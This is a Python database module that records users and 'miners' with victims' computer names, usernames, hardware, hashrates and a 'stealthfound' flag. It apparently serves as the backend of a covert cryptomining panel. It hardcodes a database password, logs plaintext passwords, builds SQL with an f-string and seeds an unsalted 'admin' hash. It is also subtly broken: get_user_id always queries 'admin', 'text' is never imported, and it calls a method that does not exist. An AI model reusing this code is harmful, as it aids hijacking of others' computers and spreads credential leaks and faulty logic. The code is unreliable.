from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy import MetaData, exc, select, update, exists
from zoneinfo import ZoneInfo
import sqlalchemy
import asyncio
import logging
import orjson
import datetime

from contextlib import asynccontextmanager
from db.models import *

engine = create_async_engine("postgresql+asyncpg://postgres:615243qp@localhost:5432/site", future=True)
async_session = async_sessionmaker(engine, expire_on_commit=False)
metadata = MetaData()
dialect = sqlalchemy.dialects.postgresql.dialect()
logging.getLogger('sqlalchemy').setLevel(logging.getLevelName(30))

@asynccontextmanager
async def session_scope():
    async with async_session() as session:
        try:
            yield session
            await session.commit()
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()

def assd(a):
    print(a)
    return a

class Users:
    def __init__(self):
        pass

    async def add_user(self, username: str, password: str):  # Добавить пользователя в базу данных
        logging.info((username, password))
        try:
            async with session_scope() as s:
                s.add(UsersTable(username=username, password=password))
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка добавления пользователя", e)
            return None

    async def get_user_id(self, username):  # Проверить если ли пользователь в базе данных
        logging.info(username)
        try:
            async with session_scope() as s:
                check = await s.execute(select(UsersTable.id).where(UsersTable.username == "admin"))
                return check.scalar()
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка получения данных пользователя", e)
            return None

    async def check_user_exists(self, username):  # Проверить если ли пользователь в базе данных
        logging.info(username)
        try:
            async with session_scope() as s:
                check = await s.execute(select(exists().where(UsersTable.username == username)))
                return check.scalar()
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка проверки существования пользователя", e)
            return None

    async def check_user_password(self, username, password):  # Проверить если ли пользователь в базе данных
        logging.info((username, password))
        try:
            async with session_scope() as s:
                check = await s.execute(select(UsersTable.password).where(UsersTable.username == username))
                return check.scalar() == password
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка проверки пароля пользователя", e)
            return None

class Miners:
    def __init__(self):
        pass

    async def add_miner(
            self, id: str,
            computername: str = None,
            username: str = None,
            gpu: str = None,
            cpu: str = None,
            runtime: int = None,
            hashrate: dict = None,
            stealthfound = None,
            mode = 1):  # Добавить майнер в базу данных
        logging.info((id, computername, username, gpu, cpu, runtime, hashrate))
        try:
            async with session_scope() as s:
                s.add(MinersTable(id=id, computername=computername, username=username, gpu=gpu, cpu=cpu, runtime=runtime, hashrate=hashrate, last_update=datetime.datetime.now(ZoneInfo("Europe/Moscow")).replace(tzinfo=None), stealthfound=stealthfound))

                if mode:
                    currect_time = datetime.datetime.now(ZoneInfo("Europe/Moscow")).strftime("%Y-%m-%d %H:%M")
                    all_hashrate = await s.execute(select(MinersTable.hashrate).where(MinersTable.id == "All"))
                    all_hashrate = all_hashrate.scalar()
                    if currect_time in all_hashrate:
                        new_all_hashrate = {currect_time: all_hashrate[currect_time] + hashrate}
                    else:
                        new_all_hashrate = {currect_time: hashrate}
                    all_hashrate.update(new_all_hashrate)
                    await s.execute(update(MinersTable).where(MinersTable.id == "All").values(hashrate=all_hashrate, last_update=datetime.datetime.now(ZoneInfo("Europe/Moscow")).replace(tzinfo=None)))
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка добавления майнера в базу данных", e)
            return None

    async def update_miner(
            self, id: str,
            computername: str = None,
            username: str = None,
            gpu: str = None,
            cpu: str = None,
            runtime: int = None,
            hashrate: dict = None,
            stealthfound = None):  # Обновить данные майнера в базе данных
        logging.info((id, computername, username, gpu, cpu, runtime, hashrate))
        try:
            async with session_scope() as s:
                new_hashrate = await s.execute(select(MinersTable.hashrate).where(MinersTable.id == id))
                new_hashrate = new_hashrate.scalar()
                new_hashrate.update({datetime.datetime.now(ZoneInfo("Europe/Moscow")).strftime("%Y-%m-%d %H:%M"): hashrate})
                await s.execute(update(MinersTable).where(MinersTable.id == id).values(computername=computername, username=username, gpu=gpu, cpu=cpu, runtime=runtime, hashrate=new_hashrate, last_update=datetime.datetime.now(ZoneInfo("Europe/Moscow")).replace(tzinfo=None), stealthfound=stealthfound))

                currect_time = datetime.datetime.now(ZoneInfo("Europe/Moscow")).strftime("%Y-%m-%d %H:%M")
                all_hashrate = await s.execute(select(MinersTable.hashrate).where(MinersTable.id == "All"))
                all_hashrate = all_hashrate.scalar()
                if currect_time in all_hashrate:
                    new_all_hashrate = {currect_time: all_hashrate[currect_time] + hashrate}
                else:
                    new_all_hashrate = {currect_time: hashrate}
                all_hashrate.update(new_all_hashrate)
                await s.execute(update(MinersTable).where(MinersTable.id == "All").values(hashrate=all_hashrate, last_update=datetime.datetime.now(ZoneInfo("Europe/Moscow")).replace(tzinfo=None)))
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка обновления майнера в базе данных", e)
            return None

    async def check_miner_exists(self, id):  # Проверить если ли майнер в базе данных
        logging.info(id)
        try:
            async with session_scope() as s:
                check = await s.execute(select(exists().where(MinersTable.id == id)))
                return check.scalar()
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка проверки существования майнера", e)
            return None

    async def get_all_miners_all_time_data(self):
        try:
            async with session_scope() as s:
                check = await s.execute(select(MinersTable))
                all_miners = {}
                hashrate_data = {}
                hashrate_sorted_data = {}
                for row in check:
                    miner = row[0]
                    for k, v in miner.hashrate.items():
                        if k[:-3] in hashrate_data:
                            hashrate_data[k[:-3]][0] = hashrate_data[k[:-3]][0] + 1
                            hashrate_data[k[:-3]][1] = hashrate_data[k[:-3]][1] + v
                        else:
                            hashrate_data[k[:-3]] = [1, v]

                    for k, v in hashrate_data.items():
                        hashrate_sorted_data[k] = v[1] // v[0]

                    all_miners[miner.id] = {"hashrate": hashrate_sorted_data, "computername": miner.computername, "username": miner.username, "gpu": miner.gpu, "cpu": miner.cpu, "runtime": miner.runtime, "last_update": miner.last_update, "stealthfound": miner.stealthfound}
                return all_miners
        except exc.SQLAlchemyError as e:
            logging.error("Ошибка получения всех майнеров и их хэшрейтов за все время", e)
            return None

async def main_db():
    engine_test = create_async_engine("postgresql+asyncpg://postgres:615243qp@localhost:5432", future=True)
    async with engine_test.connect() as conn:
        await conn.execute(text("commit"))
        db_name = "site"
        exists = await conn.execute(text(f"SELECT 1 FROM pg_database WHERE datname='{db_name}'"))
        if exists.scalar() is None:
            await conn.execute(text(f"CREATE DATABASE {db_name}"))

    async with engine.begin() as conn:
        #await conn.run_sync(Base.metadata.drop_all)
        await conn.run_sync(Base.metadata.create_all)
    miners_db = Miners()
    users_db = Users()
    await users_db.add_user("admin", "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918")
    await miners_db.add_miner("All", hashrate={"2024-09-09 00:59": 529.1657955258206}, mode=0)
    print(await miners_db.get_all_miners_all_time_hashrate())

#asyncio.run(main_db())

